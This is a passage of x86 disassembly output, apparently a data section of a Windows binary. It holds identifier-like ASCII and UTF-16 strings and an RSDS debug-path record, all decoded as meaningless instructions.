  434771:	cmp    BYTE PTR [eax],dh
  434773:	pop    edi
  434774:	inc    ecx
  434775:	dec    edi
  434776:	inc    esi
  434777:	push   eax
  434778:	add    BYTE PTR [edx+0x43],dl
  43477b:	xor    eax,0x41305f30
  434780:	xor    BYTE PTR [esi+0x5f],al
  434783:	inc    ebx
  434784:	xor    dh,BYTE PTR [edx]
  434786:	xor    eax,0x36545200
  43478b:	xor    al,0x5f
  43478d:	dec    esi
  43478e:	xor    esi,DWORD PTR [edx]
  434790:	add    BYTE PTR ss:[eax+0x4b],cl
  434794:	inc    ebx
  434795:	pop    edi
  434796:	ss xor al,0x34
  434799:	pop    edi
  43479a:	inc    ecx
  43479b:	push   esp
  43479c:	dec    edi
  43479d:	add    BYTE PTR [esi+0x52],dl
  4347a0:	push   esi
  4347a1:	pop    edi
  4347a2:	inc    esi
  4347a3:	push   ecx
  4347a4:	push   ebp
  4347a5:	push   edx
  4347a6:	dec    eax
  4347a7:	add    BYTE PTR [esi+0x41],cl
  4347aa:	inc    edx
  4347ab:	pop    edi
  4347ac:	xor    DWORD PTR [ecx],edi
  4347ae:	push   edi
  4347af:	pop    edi
  4347b0:	pop    edx
  4347b1:	xor    eax,0x47003934
  4347b6:	push   edx
  4347b7:	push   ebp
  4347b8:	pop    edi
  4347b9:	xor    al,BYTE PTR [edx+0x30]
  4347bc:	push   ebx
  4347bd:	dec    esi
  4347be:	xor    eax,0x38564300
  4347c3:	xor    al,0x5f
  4347c5:	xor    bl,BYTE PTR [eax+0x36]
  4347c8:	inc    edx
  4347c9:	pop    edi
  4347ca:	pop    ecx
  4347cb:	xor    al,BYTE PTR [ecx+0x0]
  4347ce:	push   edi
  4347cf:	dec    ecx
  4347d0:	push   ebx
  4347d1:	xor    DWORD PTR [eax],edi
  4347d3:	pop    edi
  4347d4:	push   ecx
  4347d5:	xor    BYTE PTR [edx+0x5f],cl
  4347d8:	inc    ecx
  4347d9:	add    BYTE PTR ss:[edx+0x45],al
  4347dd:	push   edi
  4347de:	cmp    DWORD PTR [eax],edi
  4347e0:	pop    edi
  4347e1:	inc    edx
  4347e2:	xor    eax,0x36520057
  4347e7:	aaa    
  4347e8:	xor    BYTE PTR [edi],dh
  4347ea:	pop    edi
  4347eb:	inc    edx
  4347ec:	cmp    DWORD PTR [edi+0x52],eax
  4347ef:	dec    esp
  4347f0:	pop    edi
  4347f1:	dec    ebx
  4347f2:	add    BYTE PTR [esp+edx*2+0x30],al
  4347f6:	pop    edi
  4347f7:	push   ebp
  4347f8:	push   ebx
  4347f9:	aaa    
  4347fa:	dec    ebp
  4347fb:	pop    edi
  4347fc:	xor    ecx,DWORD PTR [edx+0x4e]
  4347ff:	dec    ebx
  434800:	dec    edx
  434801:	add    BYTE PTR [edi+0x47],al
  434804:	xor    eax,0x534e5f32
  434809:	push   esp
  43480a:	pop    edi
  43480b:	push   esp
  43480c:	inc    edx
  43480d:	inc    esi
  43480e:	inc    esp
  43480f:	add    BYTE PTR [ebp+0x4e],al
  434812:	inc    edi
  434813:	cmp    DWORD PTR [edi+0x57],ebx
  434816:	push   eax
  434817:	push   ecx
  434818:	pop    edi
  434819:	dec    edi
  43481a:	inc    ebx
  43481b:	push   edi
  43481c:	pop    edi
  43481d:	inc    edi
  43481e:	add    BYTE PTR [edi+0x45],dl
  434821:	inc    esi
  434822:	pop    edi
  434823:	push   edx
  434824:	inc    edx
  434825:	pop    eax
  434826:	inc    edi
  434827:	ss pop edi
  434829:	push   esi
  43482a:	inc    ebx
  43482b:	dec    esi
  43482c:	inc    esp
  43482d:	add    BYTE PTR [edi+0x4d],cl
  434830:	inc    edi
  434831:	xor    ebx,DWORD PTR [edi+0x34]
  434834:	dec    esi
  434835:	pop    edx
  434836:	cmp    BYTE PTR [edi+0x58],bl
  434839:	cmp    BYTE PTR [eax],al
  43483b:	push   edx
  43483c:	pop    eax
  43483d:	push   ecx
  43483e:	pop    edi
  43483f:	dec    esp
  434840:	push   edx
  434841:	dec    ecx
  434842:	dec    edi
  434843:	inc    esp
  434844:	pop    edi
  434845:	dec    edi
  434846:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43484a:	push   eax
  43484b:	inc    ebp
  43484c:	pop    edi
  43484d:	xor    eax,0x565f3945
  434852:	add    BYTE PTR [edi+0x4e],al
  434855:	push   esi
  434856:	pop    edi
  434857:	inc    edi
  434858:	push   esp
  434859:	dec    eax
  43485a:	xor    dh,BYTE PTR [ecx]
  43485c:	pop    edi
  43485d:	dec    edi
  43485e:	xor    eax,DWORD PTR ss:[eax]
  434861:	inc    esp
  434862:	inc    ebp
  434863:	dec    ecx
  434864:	pop    edi
  434865:	push   edx
  434866:	dec    eax
  434867:	xor    al,0x48
  434869:	dec    ecx
  43486a:	ss pop edi
  43486c:	aaa    
  43486d:	aaa    
  43486e:	dec    ecx
  43486f:	dec    ebp
  434870:	add    BYTE PTR [eax+0x54],cl
  434873:	ss pop edi
  434875:	inc    esi
  434876:	inc    edx
  434877:	xor    dh,BYTE PTR [eax+eax*1]
  43487a:	dec    esi
  43487b:	ss dec edx
  43487d:	pop    edi
  43487e:	dec    ecx
  43487f:	dec    esp
  434880:	inc    edi
  434881:	inc    esp
  434882:	dec    eax
  434883:	xor    BYTE PTR [eax],bh
  434885:	xor    eax,0x34004f00
  43488a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43488e:	add    BYTE PTR [edi],dh
  434890:	add    BYTE PTR [eax],dh
  434892:	add    BYTE PTR [edi+0x0],bl
  434895:	inc    esp
  434896:	add    BYTE PTR [edi+0x0],al
  434899:	dec    ebx
  43489a:	add    BYTE PTR [edx],dh
  43489c:	add    BYTE PTR [ecx+0x0],al
  43489f:	inc    ebx
  4348a0:	add    BYTE PTR [eax],al
  4348a2:	add    BYTE PTR [edi+0x0],cl
  4348a5:	xor    al,BYTE PTR [eax]
  4348a7:	xor    eax,DWORD PTR [eax]
  4348a9:	pop    edi
  4348aa:	add    BYTE PTR [edi+0x0],dl
  4348ad:	xor    al,BYTE PTR [eax]
  4348af:	dec    edi
  4348b0:	add    BYTE PTR [edi+0x0],bl
  4348b3:	pop    edx
  4348b4:	add    BYTE PTR [eax],al
  4348b6:	add    BYTE PTR [eax+0x0],bl
  4348b9:	dec    esp
  4348ba:	add    BYTE PTR [ecx],bh
  4348bc:	add    BYTE PTR [edi+0x0],bl
  4348bf:	dec    ebx
  4348c0:	add    BYTE PTR [ecx+0x0],al
  4348c3:	dec    edx
  4348c4:	add    BYTE PTR [esi+0x0],al
  4348c7:	xor    DWORD PTR [eax],eax
  4348c9:	xor    al,0x0
  4348cb:	pop    edi
  4348cc:	add    BYTE PTR [eax+0x0],bl
  4348cf:	inc    edi
  4348d0:	add    BYTE PTR [edx+0x0],al
  4348d3:	add    BYTE PTR [eax],al
  4348d5:	push   eax
  4348d6:	add    BYTE PTR [ebx],dh
  4348d8:	add    BYTE PTR [esi+0x0],cl
  4348db:	pop    edi
  4348dc:	add    BYTE PTR [eax+0x0],cl
  4348df:	xor    eax,0x5f005300
  4348e4:	add    BYTE PTR [eax+0x0],cl
  4348e7:	add    BYTE PTR [eax],al
  4348e9:	dec    ebp
  4348ea:	add    BYTE PTR [eax],dh
  4348ec:	add    BYTE PTR [edx+0x0],al
  4348ef:	pop    edi
  4348f0:	add    BYTE PTR [edx+0x0],cl
  4348f3:	pop    eax
  4348f4:	add    BYTE PTR [eax+eax*1+0x49],dl
  4348f8:	add    BYTE PTR [eax+eax*1+0x39],cl
  4348fc:	add    BYTE PTR [eax+eax*1+0x0],cl
  434900:	add    BYTE PTR [ecx+0x0],al
  434903:	xor    eax,DWORD PTR [eax]
  434905:	xor    BYTE PTR [eax],al
  434907:	pop    edi
  434908:	add    BYTE PTR [ecx+0x0],al
  43490b:	pop    edx
  43490c:	add    BYTE PTR [ecx+0x0],dl
  43490f:	pop    edx
  434910:	add    BYTE PTR [ecx],bh
  434912:	add    BYTE PTR [esi],dh
  434914:	add    BYTE PTR [edi+0x0],bl
  434917:	dec    eax
  434918:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43491c:	add    BYTE PTR [eax],al
  43491e:	add    BYTE PTR [ecx+0x0],dl
  434921:	push   edi
  434922:	add    BYTE PTR [ecx+0x0],bl
  434925:	pop    edi
  434926:	add    BYTE PTR [esi+0x0],dl
  434929:	xor    al,0x0
  43492b:	inc    esp
  43492c:	add    BYTE PTR [ecx],dh
  43492e:	add    BYTE PTR [eax],bh
  434930:	add    BYTE PTR [edx],dh
  434932:	add    BYTE PTR [edi+0x0],bl
  434935:	cmp    DWORD PTR [eax],eax
  434937:	push   esp
  434938:	add    BYTE PTR [eax+eax*1+0x0],dl
  43493c:	add    BYTE PTR [esi+0x0],dl
  43493f:	dec    edi
  434940:	add    BYTE PTR [edi+0x0],al
  434943:	add    BYTE PTR ss:[edi+0x0],bl
  434947:	dec    edi
  434948:	add    BYTE PTR [edx+0x0],bl
  43494b:	inc    ebp
  43494c:	add    BYTE PTR [eax],dh
  43494e:	add    BYTE PTR [ebp+0x0],al
  434951:	xor    BYTE PTR [eax],al
  434953:	pop    edi
  434954:	add    BYTE PTR [eax],dh
  434956:	add    BYTE PTR ds:0x4f000000,dh
  43495c:	add    BYTE PTR ds:0x5f005700,dh
  434962:	add    BYTE PTR [edi],dh
  434964:	add    BYTE PTR [ebx+0x0],dl
  434967:	push   ebp
  434968:	add    BYTE PTR [edi+0x0],al
  43496b:	xor    al,0x0
  43496d:	pop    edi
  43496e:	add    BYTE PTR [ecx+0x0],dl
  434971:	inc    esp
  434972:	add    BYTE PTR [eax],al
  434974:	add    BYTE PTR [edx+0x0],dl
  434977:	push   esp
  434978:	add    BYTE PTR ds:0x52005f00,dh
  43497e:	add    BYTE PTR [edi+0x0],dl
  434981:	xor    al,BYTE PTR [eax]
  434983:	xor    al,BYTE PTR [eax]
  434985:	xor    BYTE PTR [eax],al
  434987:	xor    BYTE PTR [eax],al
  434989:	pop    edi
  43498a:	add    BYTE PTR [esi],dh
  43498c:	add    BYTE PTR [eax],al
  43498e:	add    BYTE PTR [eax+0x0],cl
  434991:	inc    ebp
  434992:	add    BYTE PTR [eax+eax*1+0x30],cl
  434996:	add    BYTE PTR [edi+0x0],bl
  434999:	dec    edx
  43499a:	add    BYTE PTR [edx],dh
  43499c:	add    BYTE PTR [edi],dh
  43499e:	add    BYTE PTR [ebp+0x0],dl
  4349a1:	add    BYTE PTR ss:[eax],dh
  4349a4:	add    BYTE PTR [eax],al
  4349a6:	add    BYTE PTR [esi+0x0],dl
  4349a9:	cmp    BYTE PTR [eax],al
  4349ab:	dec    edi
  4349ac:	add    BYTE PTR [ecx],bh
  4349ae:	add    BYTE PTR [edi+0x0],bl
  4349b1:	pop    eax
  4349b2:	add    BYTE PTR [edx+0x0],bl
  4349b5:	dec    esp
  4349b6:	add    BYTE PTR [ebx+0x0],cl
  4349b9:	add    BYTE PTR [eax],al
  4349bb:	dec    ecx
  4349bc:	add    BYTE PTR [ebp+0x0],dl
  4349bf:	dec    edi
  4349c0:	add    BYTE PTR [eax],al
  4349c2:	add    BYTE PTR [edx+0x53],dl
  4349c5:	inc    esp
  4349c6:	push   ebx
  4349c7:	ss pop ds
  4349c9:	dec    edi
  4349ca:	adc    BYTE PTR [ebp-0x6bbb0d3a],0xf
  4349d1:	jg     0x434990
  4349d3:	dec    esi
  4349d4:	ins    BYTE PTR es:[edi],dx
  4349d5:	lock cmp ebx,DWORD PTR [edx]
  4349d8:	add    BYTE PTR [eax],al
  4349da:	add    BYTE PTR [ebx+0x3a],dl
  4349dd:	pop    esp
  4349de:	popa   
  4349df:	jbe    0x434a56
  4349e1:	jns    0x434a50
  4349e3:	dec    ecx
  4349e4:	jb     0x434a60
  4349e6:	pop    esp
  4349e7:	bound  di,DWORD PTR [edx+0x52]
  4349eb:	gs fs push ax
  4349ef:	arpl   WORD PTR [esi+0x5c],si
  4349f2:	js     0x434a4e
  4349f4:	je     0x434a3d
  4349f6:	jno    0x434a3a
  4349f8:	jno    0x434a61
  4349fa:	bound  ebp,QWORD PTR [esi]
  4349fc:	jo     0x434a62
  4349fe:	bound  eax,QWORD PTR [eax]
